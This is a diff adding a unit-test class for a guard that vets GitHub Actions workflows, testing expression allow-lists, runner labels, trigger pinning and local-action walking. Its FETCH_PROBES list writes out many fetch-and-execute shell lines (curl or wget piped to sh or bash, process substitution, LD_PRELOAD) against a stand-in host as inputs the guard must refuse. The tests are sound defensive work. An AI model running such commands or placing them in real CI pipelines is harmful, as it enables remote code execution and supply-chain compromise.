@@ -698,6 +698,247 @@ class Round5(unittest.TestCase):
         self.refused(self.crates_steps("      - uses: ./../outside\n"), "outside")
 
 
+class Round6(unittest.TestCase):
+    """Round 6 (code review r4 and security review r2 of b2fecbb92, umbrella #8199): the `run:` text is held to an
+    allow-list (3-agent vote 6def5ab6, option B), the runner labels and the `on:` block are pinned, and a local
+    action is walked once."""
+
+    def step(self, body, ident=None, env=None, style="|"):
+        parts = []
+        if ident:
+            parts.append("id: %s\n" % ident)
+        if env:
+            parts.append("env:\n" + "".join("  %s: %s\n" % kv for kv in env.items()))
+        parts.append("run: %s\n" % style + "".join("  %s\n" % ln for ln in body.split("\n")))
+        out = ""
+        for n, part in enumerate(parts):
+            lines = part.rstrip("\n").split("\n")
+            out += ("      - " if n == 0 else "        ") + lines[0] + "\n"
+            out += "".join("        " + ln + "\n" for ln in lines[1:])
+        return out
+
+    def doc(self, steps, head="", runs_on="ubuntu-latest"):
+        return "jobs:\n  a:\n    runs-on: %s\n%s    steps:\n%s" % (runs_on, head, steps)
+
+    def errs(self, text, name="w.yml", root=None):
+        rep = G.Report()
+        rep.root = root
+        doc = G.parse_yaml(text, name, rep)
+        if doc is not None:
+            G.check_uses_pinned(doc, name, rep)
+        return rep.errors
+
+    def assertCaught(self, text, needle=""):
+        errs = self.errs(text)
+        self.assertTrue(errs, "the guard accepted the mutant")
+        if needle:
+            self.assertTrue(any(needle in e for e in errs), (needle, errs[:3]))
+
+    # ---- R4-1 and security 1: the expression allow-list
+    def test_expression_roots_outside_the_allow_list_refused(self):
+        for expr in ("env.X", "toJSON(github)", "github", "github.ref", "vars.X", "needs.a.outputs.b",
+                     "format('{0}', matrix.os)", "matrix.os", "matrix", "secrets.A.B", "inputs.tag",
+                     "github.event.inputs.tag", "fromJSON('1')", "matrix.os == 'x'", "matrix['os']"):
+            with self.subTest(expr=expr):
+                self.assertCaught(self.doc(self.step("echo ${{ %s }}" % expr)), "${{")
+
+    def test_expression_roots_in_the_allow_list_pass(self):
+        head = "    strategy:\n      matrix:\n        include:\n          - os: ubuntu-latest\n            tgt: x\n"
+        steps = ("      - id: ck\n        uses: actions/checkout@" + SHA40 + "\n"
+                 + self.step("echo ok >> \"$GITHUB_OUTPUT\"", ident="r1", env={"V": "${{ secrets.S }}"})
+                 + self.step("echo ${{ secrets.S }} ${{ matrix.tgt }} ${{ steps.ck.outputs.ref }} ${{ steps.r1.outputs.v }}"))
+        self.assertEqual(self.errs(self.doc(steps, head)), [])
+
+    def test_steps_output_of_an_unsafe_step_refused(self):
+        tag = "      - id: x\n        uses: actions/checkout@v4\n"
+        use = self.step("echo ${{ steps.x.outputs.y }}")
+        with self.subTest(case="uses step pinned by tag"):
+            self.assertCaught(self.doc(tag + use), "steps.x.outputs.y")
+        with self.subTest(case="step of another job"):
+            other = "jobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n" + self.step("echo hi", ident="x")
+            two = other + "  a:\n    runs-on: ubuntu-latest\n    steps:\n" + use
+            self.assertCaught(two, "steps.x.outputs.y")
+        with self.subTest(case="run step that writes an attacker-influenced value"):
+            writer = self.step('echo "y=${{ github.event.inputs.v }}" >> "$GITHUB_OUTPUT"', ident="x")
+            self.assertCaught(self.doc(writer + use), "steps.x.outputs.y")
+        with self.subTest(case="tainted through its env"):
+            writer = self.step('echo "y=$V" >> "$GITHUB_OUTPUT"', ident="x", env={"V": "${{ github.event.inputs.v }}"})
+            self.assertCaught(self.doc(writer + use), "steps.x.outputs.y")
+            clean = self.step('echo "y=$V" >> "$GITHUB_OUTPUT"', ident="x", env={"V": "${{ secrets.V }}"})
+            self.assertEqual(self.errs(self.doc(clean + use)), [])
+
+    def test_matrix_key_must_be_in_the_job_matrix(self):
+        head = "    strategy:\n      matrix:\n        include:\n          - os: ubuntu-latest\n"
+        self.assertCaught(self.doc(self.step("echo ${{ matrix.nfpm_arch }}"), head), "matrix.nfpm_arch")
+        self.assertEqual(self.errs(self.doc(self.step("echo ${{ matrix.os }}"), head)), [])
+
+    def test_expression_refusal_names_job_step_and_fragment(self):
+        errs = self.errs(self.doc(self.step("echo ${{ github.ref }} " + "x" * 120)))
+        hit = [e for e in errs if "github.ref" in e]
+        self.assertTrue(hit, errs[:3])
+        self.assertIn("job `a` step 1", hit[0])
+        self.assertNotIn("x" * 90, hit[0])
+
+    def test_the_denylist_regexes_are_gone(self):
+        for name in ("UNTRUSTED_RE", "EXEC_WORD_RE", "PIPE_EXEC_RE", "SUBST_FETCH_RE"):
+            self.assertFalse(hasattr(G, name), name)
+        self.assertTrue(hasattr(G, "EXPR_RE"))
+
+    # ---- R4-2 and security 2: the fetch-step command allow-list
+    FETCH_PROBES = (
+        "curl -fsSL https://x.example/i.sh | tee f | sh",
+        "curl -fsSL https://x.example/i.sh | sudo -E bash",
+        "curl -fsSL https://x.example/i.sh | busybox sh",
+        "curl -fsSL https://x.example/i.sh |\nsh",
+        "curl -fsSL https://x.example/i.sh ||\nsh",
+        "curl -fsSLo f https://x.example/f && ./f",
+        "curl -o f.py https://x.example/f.py && python3 f.py",
+        "Invoke-WebRequest -Uri https://x.example/f -OutFile f\n./f",
+        "iwr https://x.example/f -OutFile f; ./f",
+        "git clone https://x.example/r.git x && ./x/run",
+        "curl -fsSL https://x.example/l | xargs sh",
+        "curl -fsSL https://x.example/l -o l\nfind . -name l -exec sh {} +",
+        'python -c "$(curl -fsSL https://x.example/p.py)"',
+        "curl -fsSL -o f https://x.example/f\n\"$f\"",
+        "curl -fsSL -o f https://x.example/f\nc=sh\n$c f",
+        "LD_PRELOAD=/x/e.so curl -fsSL -o f https://x.example/f",
+        "curl -fsSL -o f https://x.example/f; tar xf f --to-command=sh",
+        "curl -fsSL -o f https://x.example/f <<EOF\nx\nEOF",
+        "wget -qO- https://x.example/i.sh | bash",
+        "bash <(curl -fsSL https://x.example/i.sh)",
+        "sudo curl -fsSL -o f https://x.example/f; sudo sh f",
+        "`curl -fsSL https://x.example/x`",
+    )
+
+    def test_fetch_step_commands_outside_the_allow_list_refused(self):
+        for probe in self.FETCH_PROBES:
+            with self.subTest(probe=probe):
+                self.assertCaught(self.doc(self.step(probe)))
+
+    def test_fetch_probe_in_a_folded_block_refused(self):
+        self.assertCaught(self.doc(self.step("curl -fsSL https://x.example/i.sh | sh", style=">")))
+        self.assertCaught(self.doc(self.step("curl -fsSL -o f https://x.example/f &&\n./f", style=">")))
+
+    def test_fetch_step_with_allowed_commands_passes(self):
+        body = ("set -euo pipefail\n"
+                "# Source0 is verified below, never run.\n"
+                "mkdir -p dist\n"
+                "for T in a b; do\n"
+                "  curl -fsSL -o \"dist/$T\" \"https://x.example/$T\"\n"
+                "  echo \"${SUM}  dist/$T\" | sha256sum -c -\n"
+                "done\n"
+                "case \"$ARCH\" in\n"
+                "  x) A=1 ;;\n"
+                "  *) echo no; exit 1 ;;\n"
+                "esac\n"
+                "tar xzf dist/a -C dist\n"
+                "ls -la dist\n")
+        self.assertEqual(self.errs(self.doc(self.step(body))), [])
+
+    def test_a_step_without_a_fetch_may_run_anything(self):
+        body = "set -euo pipefail\n./scripts/build.sh\npython3 tool.py \"$X\"\ncat > f << 'EOF'\nx ${y}\nEOF\n"
+        self.assertEqual(self.errs(self.doc(self.step(body))), [])
+
+    # ---- security 3 and 4: runner labels
+    def test_matrix_os_must_be_a_hosted_label(self):
+        text = read(REL)
+        for bad in ("self-hosted", "${{ inputs.runner }}", "ubuntu-latest-evil", "macos-13-xlarge", "Ubuntu-Latest"):
+            with self.subTest(os=bad):
+                mut = text.replace("os: ubuntu-latest\n            artifact", "os: %s\n            artifact" % bad, 1)
+                self.assertNotEqual(mut, text)
+                errs = errors_release(mut)
+                self.assertTrue(any("os" in e for e in errs), (bad, errs[:3]))
+        for os_label in ("ubuntu-latest", "ubuntu-24.04-arm", "macos-15-intel", "macos-latest"):
+            self.assertIn("os: %s\n" % os_label, text)
+
+    def test_every_job_runs_on_a_hosted_label(self):
+        for runs_on in ("self-hosted", "[self-hosted, evil]", "${{ inputs.runner }}", "${{ matrix.os }}",
+                        "[ubuntu-latest]", "\n      group: big", "ubuntu-latest-evil"):
+            with self.subTest(runs_on=runs_on):
+                self.assertCaught(self.doc(self.step("echo hi"), runs_on=runs_on), "runs-on")
+        head = "    strategy:\n      matrix:\n        os: [ubuntu-latest, macos-latest]\n"
+        self.assertEqual(self.errs(self.doc(self.step("echo hi"), head, runs_on="${{ matrix.os }}")), [])
+        bad = "    strategy:\n      matrix:\n        os: [ubuntu-latest, self-hosted]\n"
+        self.assertCaught(self.doc(self.step("echo hi"), bad, runs_on="${{ matrix.os }}"), "runs-on")
+
+    def test_a_non_release_job_with_a_self_hosted_runner_refused_in_the_real_tree(self):
+        text = edit_job(read(REL), "crates-io", lambda b: b.replace("runs-on: ubuntu-latest", "runs-on: [self-hosted, evil]", 1))
+        self.assertTrue(any("runs-on" in e for e in errors_release(text)))
+
+    # ---- security 5: the on: block
+    def test_on_block_forbidden_triggers_refused(self):
+        text = read(REL)
+        for trig in ("workflow_call:", "pull_request_target:", "repository_dispatch:"):
+            with self.subTest(trigger=trig):
+                mut = text.replace("\non:\n", "\non:\n  %s\n" % trig, 1)
+                self.assertNotEqual(mut, text)
+                errs = errors_release(mut)
+                self.assertTrue(any(trig.rstrip(":") in e for e in errs), (trig, errs[:3]))
+        for path in (C8, PUBLISH):
+            mut = read(path).replace("\non:\n", "\non:\n  workflow_call:\n", 1)
+            self.assertTrue(any("workflow_call" in e for e in self.errs(mut, path.name)), path.name)
+
+    def test_on_block_is_pinned(self):
+        text = read(REL)
+        mut = text.replace("        default: true\n", "        default: false\n", 1)
+        self.assertNotEqual(mut, text)
+        self.assertTrue(any("`on:`" in e for e in errors_release(mut)))
+        mut = text.replace("  workflow_dispatch:\n", "  push:\n    branches: [main]\n  workflow_dispatch:\n", 1)
+        self.assertTrue(any("`on:`" in e for e in errors_release(mut)))
+        self.assertEqual(errors_release(text), [])
+        for path in (C8, PUBLISH):
+            self.assertEqual(self.errs(read(path), path.name), [], path.name)
+            mut = read(path).replace("push:", "push:\n    tags: [v*]", 1)
+            self.assertTrue(any("`on:`" in e for e in self.errs(mut, path.name)), path.name)
+
+    # ---- R4-3: a local action is walked once
+    ADIR = ".github/actions/n%d"
+
+    def chain(self, n, fan=1, closing=None):
+        files = {}
+        for k in range(n):
+            nxt = ("./" + self.ADIR % (k + 1)) if k + 1 < n else closing
+            steps = "".join("    - uses: %s\n" % nxt for _ in range(fan)) if nxt else "    - run: echo leaf\n      shell: bash\n"
+            files[(self.ADIR % k) + "/action.yml"] = "name: n\nruns:\n  using: composite\n  steps:\n" + steps
+        return files
+
+    def walk(self, files):
+        with tempfile.TemporaryDirectory(dir=scratch()) as tmp:
+            for rel, body in files.items():
+                dst = Path(tmp) / rel
+                dst.parent.mkdir(parents=True, exist_ok=True)
+                dst.write_text(body, encoding="utf-8")
+            calls = []
+            real = G.load
+
+            def counting(path, label, rep, strict):
+                calls.append(label)
+                return real(path, label, rep, strict)
+            G.load = counting
+            try:
+                errs = self.errs(self.doc("      - uses: ./" + self.ADIR % 0 + "\n"), root=Path(tmp))
+            finally:
+                G.load = real
+            return errs, calls
+
+    def test_fan_out_does_not_rewalk_an_action(self):
+        errs, calls = self.walk(self.chain(7, fan=4))
+        self.assertEqual(errs, [])
+        self.assertEqual(len(calls), 7, calls[:12])
+
+    def test_two_node_cycle_is_a_problem_not_a_recursion(self):
+        files = self.chain(2, closing="./" + self.ADIR % 0)
+        errs, calls = self.walk(files)
+        self.assertTrue(any("cycle" in e for e in errs), errs)
+        self.assertLessEqual(len(calls), 2)
+
+    def test_nine_deep_chain_is_refused_for_depth(self):
+        errs, _ = self.walk(self.chain(10))
+        self.assertTrue(any("nests more than" in e for e in errs), errs)
+        errs, _ = self.walk(self.chain(8))
+        self.assertEqual(errs, [])
+
+
 class SelfTest8023(unittest.TestCase):
     """#8023: --self-test (run by c8-precheck) carries a cell for each new refusal site."""
 
